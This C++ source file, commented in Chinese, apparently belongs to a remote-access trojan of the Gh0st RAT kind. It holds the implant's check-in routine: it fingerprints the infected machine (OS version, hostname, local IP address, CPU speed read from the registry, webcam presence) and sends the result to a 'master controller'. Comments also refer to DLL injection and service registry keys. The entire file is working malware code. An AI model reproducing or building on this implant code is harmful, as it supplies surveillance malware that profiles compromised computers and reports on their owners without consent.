#include "StdAfx.h"
#include "Login.h"
#include "Common.h"
#include "RegEditEx.h"
#include <windows.h>
#include <vfw.h>    //摄像头的相关头文件


#pragma comment(lib,"Vfw32.lib")


//登陆请求
int SendLoginInfo(LPCTSTR strServiceName, CClientSocket *pClient, DWORD dwSpeed)
{
	int nRet = SOCKET_ERROR;
	// 登录信息
	LOGININFO	LoginInfo;
	// 开始构造数据
	LoginInfo.bToken = TOKEN_LOGIN; // 令牌为登录
	LoginInfo.bIsWebCam = 0;        //没有摄像头
	LoginInfo.OsVerInfoEx.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEX);
	GetVersionEx((OSVERSIONINFO *)&LoginInfo.OsVerInfoEx); // 注意转换类型
	// IP信息
	
	// 主机名
	char hostname[256];
	//				127.0.0.1	  ASUS-PC
	GetHostRemark(strServiceName, hostname, sizeof(hostname));  //获得自己的名称
	

	sockaddr_in  sockAddr;
	memset(&sockAddr, 0, sizeof(sockAddr));
	int nSockAddrLen = sizeof(sockAddr);
	//The getsockname function retrieves the local name for a socket.
	// 本地IP地址
	getsockname(pClient->m_Socket, (SOCKADDR*)&sockAddr, &nSockAddrLen);

	//谁  TCP/IP 
	
	
	memcpy(&LoginInfo.IPAddress, (void *)&sockAddr.sin_addr, sizeof(IN_ADDR));
	memcpy(&LoginInfo.HostName, hostname, sizeof(LoginInfo.HostName));

	LoginInfo.CPUClockMhz = CPUClockMhz();   //获得CPU的性能
	LoginInfo.bIsWebCam = IsWebCam();        //有无摄像头
	

	LoginInfo.dwSpeed = dwSpeed;             //网络速度
	
	nRet = pClient->Send((LPBYTE)&LoginInfo, sizeof(LOGININFO));   //向主控制端发送我们获得的信息
	
	return nRet;
}

//获得主机的名称
UINT GetHostRemark(LPCTSTR lpServiceName, LPTSTR lpBuffer, UINT uSize)
{
	char	strSubKey[1024];
	memset(lpBuffer, 0, uSize);
	memset(strSubKey, 0, sizeof(strSubKey));

	//Dll注入  Socket协议  Ndis
//	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	//从注册表中获得
//	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey, "Host", REG_SZ, 
//		(char *)lpBuffer, NULL, uSize, 0);
	
//	if (lstrlen(lpBuffer) == 0)   //如果失败我们就调用API函数
	{
		gethostname(lpBuffer, uSize);   
	}
	
	return lstrlen(lpBuffer);
}



//从注册表中获得System的信息
DWORD CPUClockMhz()
{
	HKEY	hKey;
	DWORD	dwCPUMhz;
	DWORD	dwBytes = sizeof(DWORD);
	DWORD	dwType = REG_DWORD;
	RegOpenKey(HKEY_LOCAL_MACHINE, 
		"HARDWARE\\DESCRIPTION\\System\\CentralProcessor\\0", &hKey);
	RegQueryValueEx(hKey, "~MHz", NULL, &dwType, (PBYTE)&dwCPUMhz, &dwBytes);
	RegCloseKey(hKey);
	return	dwCPUMhz;
}


bool IsWebCam()
{
	bool	bRet = false;
	
	char	lpszName[100], lpszVer[50];
	for (int i = 0; i < 10 && !bRet; i++)
	{
		bRet = capGetDriverDescription(i, lpszName, sizeof(lpszName),      //系统的API函数
			lpszVer, sizeof(lpszVer));
	}
	return bRet;
}